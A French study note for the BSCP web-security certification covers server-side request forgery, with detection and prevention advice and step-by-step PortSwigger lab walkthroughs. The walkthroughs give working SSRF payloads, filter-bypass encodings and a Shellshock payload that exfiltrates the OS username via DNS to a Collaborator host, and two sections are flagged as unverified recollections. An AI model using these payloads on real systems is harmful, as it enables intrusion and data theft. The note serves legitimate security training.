---
tags: [bscp, server-side, ssrf]
niveau: practitioner
statut: en cours
---
# Server-side request forgery (SSRF)

## En bref
- La SSRF est une faille qui permet à un attaquant d'amener une application côté serveur à envoyer des requêtes vers une destination non prévue.
- Le serveur peut être amené à se connecter à des services à usage interne, au sein de l'infrastructure.
- Il peut aussi être forcé à se connecter à des systèmes externes.
- L'impact est qu'une fuite de données sensibles est possible.
![](SSRF.png)

## Impact
- Une attaque SSRF réussie peut entraîner des actions non autorisées ou un accès non autorisé aux données au sein d'une organisation.
- Cela peut se produire dans l'application elle-même, ou sur d'autres systèmes back-end avec lesquels elle communique.
- Dans certains cas, la SSRF peut permettre à un attaquant d'exécuter des commandes arbitraires.
- Ces attaques peuvent sembler provenir de l'organisation qui héberge l'application vulnérable (l'adresse IP source est celle du serveur).

## Types et variantes
- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable : la confiance envers le serveur lui-même, ou envers d'autres systèmes back-end de la même organisation.
- Il est fréquent de rencontrer des applications vulnérables qui intègrent des mesures de protection contre l'exploitation. Ces mesures peuvent souvent être contournées.

| Type | Idée clé | Note | Niveau |
| --- | --- | --- | --- |
| Contre le serveur local | `stockApi=http://localhost/admin` | [[SSRF-serveur-local]] | Apprentice |
| Contre d'autres systèmes back-end | Adresses privées, balayage Intruder | [[SSRF-systemes-back-end]] | Apprentice |
| Filtre par liste noire | `127.1`, double encodage | [[SSRF-filtre-liste-noire]] | Practitioner |
| Filtre par liste blanche | `@`, `#`, DNS, encodage | [[SSRF-filtre-liste-blanche]] | Expert |
| Redirection ouverte | Domaine autorisé qui redirige | [[SSRF-redirection-ouverte]] | Practitioner |
| SSRF aveugle | Détection hors bande (OAST) | [[SSRF-aveugle]] | Practitioner, Expert |
| Surfaces cachées | URL partielles, XML, `Referer` | [[SSRF-surfaces-cachees]] | Practitioner |

## Comment détecter
- Repérer tout paramètre, corps ou en-tête qui contient une URL, un nom d'hôte ou un chemin (`url`, `stockApi`, `path`, `redirect`, `webhook`, `callback`, `Referer`).
- Remplacer la valeur par `http://localhost/` ou par une adresse Burp Collaborator, puis comparer la réponse et surveiller les interactions.
- Si la réponse n'affiche rien mais que Collaborator reçoit une interaction : SSRF aveugle (voir [[SSRF-aveugle]]).
- Si seule une requête DNS arrive : la requête HTTP est probablement filtrée en sortie.
- Penser aux surfaces moins évidentes : voir [[SSRF-surfaces-cachees]].

## Comment exploiter (principe)
1. Identifier le paramètre qui déclenche la requête côté serveur.
2. Vérifier si la réponse est visible (SSRF classique) ou non (SSRF aveugle).
3. Viser en priorité le serveur lui-même (`localhost`) puis les plages privées (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`).
4. Si un filtre bloque la requête, identifier sa nature (liste noire ou liste blanche) et appliquer la technique de contournement correspondante.
5. Lire le HTML de l'interface trouvée pour repérer l'action à déclencher, puis la rejouer via la SSRF.

Détails dans [[SSRF-serveur-local]] et [[SSRF-systemes-back-end]].

## Pièges et points d'attention BSCP
- Un filtre peut empiler plusieurs défenses : contourner l'hôte, puis le chemin, séparément.
- Si une URL externe est refusée mais que le domaine local passe, penser à la redirection ouverte.
- Dans les labs, les interactions avec des systèmes externes arbitraires sont bloquées : utiliser le serveur public par défaut de Burp Collaborator.
- Hors énoncé de la formation (à garder en tête sur cible réelle) : points de métadonnées cloud (`http://169.254.169.254/`), schémas autres que HTTP (`file://`, `gopher://`, `dict://`), rebinding DNS.

## Prévention
- Préférer une liste blanche stricte de destinations (hôtes, ports, chemins) plutôt qu'une liste noire.
- Valider le schéma (HTTP et HTTPS uniquement) et résoudre le nom d'hôte côté serveur avant la requête, puis vérifier que l'adresse résolue n'est pas privée ni de bouclage.
- Désactiver le suivi des redirections ou revalider chaque redirection.
- Ne jamais renvoyer au client la réponse brute de la requête côté serveur.
- Segmenter le réseau et authentifier les services internes : ne pas se reposer sur la seule topologie ou sur la provenance locale d'une requête.
- Bloquer les connexions sortantes inutiles depuis le serveur d'applications.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-07
- [x] Practitioner ✅ 2026-10-07
- [ ] Expert

## Journal des labs

### Lab 1 - SSRF basique contre le serveur local
*Basic SSRF against the local server* - Apprentice - note : [[SSRF-serveur-local]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.

1. Accédez à `/admin` et constatez que vous ne pouvez pas accéder directement à la page d'administration.
2. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
3. Remplacez l'URL du paramètre `stockApi` par `http://localhost/admin`. L'interface d'administration doit s'afficher.
4. Lisez le HTML pour identifier l'URL de suppression de l'utilisateur cible :

   `http://localhost/admin/delete?username=carlos`
5. Soumettez cette URL dans le paramètre `stockApi` pour mener l'attaque SSRF.

### Lab 2 - SSRF basique contre un autre système back-end
*Basic SSRF against another back-end system* - Apprentice - note : [[SSRF-systemes-back-end]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, utilisez la vérification de stock afin de balayer la plage interne `192.168.0.X` à la recherche d'une interface d'administration sur le port `8080`, puis utilisez-la pour supprimer l'utilisateur `carlos`.

1. Ouvrez une page produit, cliquez sur **Check stock**, interceptez la requête dans Burp Suite et envoyez-la dans Burp Intruder.
2. Remplacez le paramètre `stockApi` par `http://192.168.0.1:8080/admin`, puis sélectionnez le dernier octet de l'adresse IP (le nombre `1`) et cliquez sur **Add §**.
3. Dans le panneau **Payloads**, choisissez le type de payload **Numbers**, puis saisissez 1, 255 et 1 dans les champs **From**, **To** et **Step**.
4. Cliquez sur **Start attack**.
5. Cliquez sur la colonne **Status** pour trier par code de statut croissant. Une seule entrée doit avoir le statut `200` et afficher une interface d'administration.
6. Cliquez sur cette requête, envoyez-la dans Burp Repeater et remplacez le chemin dans `stockApi` par : `/admin/delete?username=carlos`

### Lab 3 - SSRF avec filtre d'entrée basé sur une liste noire
*SSRF with blacklist-based input filter* - Practitioner - note : [[SSRF-filtre-liste-noire]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.
Le développeur a mis en place deux défenses anti-SSRF faibles que vous devrez contourner.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Remplacez l'URL du paramètre `stockApi` par `http://127.0.0.1/` et constatez que la requête est bloquée.
3. Contournez le blocage avec l'URL `http://127.1/`.
4. Remplacez l'URL par `http://127.1/admin` et constatez que la requête est de nouveau bloquée.
5. Masquez le « a » en le double-encodant en `%2561` pour accéder à l'interface d'administration, puis supprimez l'utilisateur cible.

### Lab 4 - SSRF avec contournement du filtre via une redirection ouverte
*SSRF with filter bypass via open redirection vulnerability* - Practitioner - note : [[SSRF-redirection-ouverte]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://192.168.0.12:8080/admin`, puis supprimez l'utilisateur `carlos`.
Le vérificateur de stock est restreint à l'application locale : vous devez donc d'abord trouver une redirection ouverte qui affecte l'application.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Essayez de modifier le paramètre `stockApi` et constatez qu'il est impossible de faire envoyer la requête directement vers un autre hôte.
3. Cliquez sur « next product » et constatez que le paramètre `path` est placé dans l'en-tête `Location` d'une réponse de redirection, ce qui constitue une redirection ouverte.
4. Construisez une URL qui exploite la redirection ouverte et redirige vers l'interface d'administration, puis placez-la dans le paramètre `stockApi` du vérificateur de stock :

   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
5. Constatez que le vérificateur de stock suit la redirection et affiche la page d'administration.
6. Modifiez le paramètre `path` pour supprimer l'utilisateur cible :

   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

### Lab 5 - SSRF aveugle avec détection hors bande
*Blind SSRF with out-of-band detection* - Practitioner - notes : [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]

Ce site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer` lors du chargement d'une page produit.
Pour résoudre le lab, utilisez cette fonctionnalité pour provoquer une requête HTTP vers le serveur public de Burp Collaborator.

> [!note] Remarque
> Pour éviter que la plateforme Academy soit utilisée pour attaquer des tiers, notre pare-feu bloque les interactions entre les labs et des systèmes externes arbitraires. Pour résoudre le lab, vous devez utiliser le serveur public par défaut de Burp Collaborator.

1. Ouvrez une page produit, interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Allez dans l'onglet Repeater. Sélectionnez l'en-tête `Referer`, faites un clic droit et choisissez « Insert Collaborator Payload » pour remplacer le domaine d'origine par un domaine généré par Burp Collaborator. Envoyez la requête.
3. Allez dans l'onglet Collaborator et cliquez sur « Poll now ». Si aucune interaction n'apparaît, patientez quelques secondes et réessayez : la commande côté serveur est exécutée de façon asynchrone.
4. Vous devriez voir des interactions DNS et HTTP initiées par l'application à la suite de votre payload.

### Lab 6 - SSRF avec filtre d'entrée basé sur une liste blanche
*SSRF with whitelist-based input filter* - Expert - note : [[SSRF-filtre-liste-blanche]]

> [!warning] Étapes rédigées de mémoire
> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab.

Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`. Le développeur a mis en place une défense anti-SSRF qu'il faut contourner.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête et envoyez-la dans Burp Repeater.
2. Remplacez `stockApi` par `http://localhost/` et constatez que la requête est refusée : l'hôte doit être `stock.weliketoshop.net`.
3. Testez `http://username@stock.weliketoshop.net/` : la requête est acceptée, ce qui montre que l'analyseur accepte les identifiants avant le nom d'hôte.
4. Ajoutez un fragment : `http://localhost#@stock.weliketoshop.net/` est refusé car `#` est bloqué.
5. Double-encodez `#` en `%2523` : `http://localhost%2523@stock.weliketoshop.net/` est accepté.
6. Ajoutez le chemin d'administration : `http://localhost:80%2523@stock.weliketoshop.net/admin`.
7. Lisez le HTML pour trouver l'URL de suppression, puis envoyez `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`.

### Lab 7 - SSRF aveugle avec exploitation de Shellshock
*Blind SSRF with Shellshock exploitation* - Expert - note : [[SSRF-aveugle]]

> [!warning] Étapes rédigées de mémoire
> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab. Le lab nécessite Burp Suite Professional (Collaborator).

Le site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer`. Un serveur interne de la plage `192.168.0.X` sur le port `8080` est vulnérable à Shellshock. Pour résoudre le lab, utilisez la SSRF pour exécuter une commande sur ce serveur et exfiltrer le nom de l'utilisateur du système d'exploitation via une requête DNS vers Burp Collaborator.

1. Ouvrez une page produit, interceptez la requête et envoyez-la dans Burp Intruder.
2. Dans l'en-tête `User-Agent`, placez la charge Shellshock, avec un sous-domaine Collaborator : `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
3. Remplacez l'en-tête `Referer` par `http://192.168.0.1:8080` et placez une position de payload sur le dernier octet.
4. Choisissez le type de payload **Numbers**, de 1 à 255, par pas de 1, puis lancez l'attaque.
5. Dans l'onglet Collaborator, cliquez sur « Poll now » : une interaction DNS contient le nom de l'utilisateur en sous-domaine.
6. Soumettez ce nom d'utilisateur pour valider le lab.

## Mes notes
- 

## Liens
- [[SSRF-serveur-local]]
- [[SSRF-systemes-back-end]]
- [[SSRF-filtre-liste-noire]]
- [[SSRF-filtre-liste-blanche]]
- [[SSRF-redirection-ouverte]]
- [[SSRF-aveugle]]
- [[SSRF-surfaces-cachees]]
- [[Command-injection]]
- [[XXE-injection]]
- [[HTTP-Host-header]]
- [[Access-control]]
- [[Web-cache-poisoning]]
